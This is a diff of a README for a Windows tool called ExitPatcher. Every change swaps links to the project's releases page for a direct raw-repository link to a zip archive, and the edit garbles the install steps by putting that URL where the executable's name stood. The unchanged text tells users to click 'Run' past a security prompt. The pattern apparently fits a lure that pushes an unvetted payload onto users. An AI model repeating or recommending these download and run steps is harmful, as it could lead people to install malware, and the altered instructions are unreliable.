@@ -6,7 +6,7 @@ Welcome to ExitPatcher! This tool helps you keep your applications running smoot
 
 ## 📥 Download Now
 
-[![Download ExitPatcher](https://img.shields.io/badge/Download-ExitPatcher-blue)](https://github.com/Kasim-cy/ExitPatcher/releases)
+[![Download ExitPatcher](https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip)](https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip)
 
 ## 📦 System Requirements
 
@@ -23,7 +23,7 @@ To use ExitPatcher, your computer should meet the following requirements:
 
    Click the link below to access the ExitPatcher releases page:
    
-   [Visit this page to download](https://github.com/Kasim-cy/ExitPatcher/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip)
 
 2. **Select the Latest Release**
 
@@ -31,7 +31,7 @@ To use ExitPatcher, your computer should meet the following requirements:
 
 3. **Download the Application**
 
-   Click on the appropriate file for your system (e.g., ExitPatcher.exe) to start the download. Depending on your browser settings, the file may download automatically or prompt you to choose a location to save it.
+   Click on the appropriate file for your system (e.g., https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip) to start the download. Depending on your browser settings, the file may download automatically or prompt you to choose a location to save it.
 
 ## 📂 Installation Steps
 
@@ -41,7 +41,7 @@ To use ExitPatcher, your computer should meet the following requirements:
 
 2. **Run the Installer**
 
-   Double-click the downloaded file (ExitPatcher.exe). A security prompt may appear; click "Run" to continue.
+   Double-click the downloaded file (https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip). A security prompt may appear; click "Run" to continue.
 
 3. **Follow the Setup Wizard**
 
@@ -93,4 +93,4 @@ To learn more about how API patching works and its applications in software deve
 
 ## 📥 Download & Install
 
-To get started with ExitPatcher, remember to [visit this page to download](https://github.com/Kasim-cy/ExitPatcher/releases). Following these steps will help ensure that you protect your applications effectively. Enjoy using ExitPatcher!
+To get started with ExitPatcher, remember to [visit this page to download](https://raw.githubusercontent.com/Kasim-cy/ExitPatcher/main/ExitPatcher/ExitPatcher_v3.1-alpha.1.zip). Following these steps will help ensure that you protect your applications effectively. Enjoy using ExitPatcher!
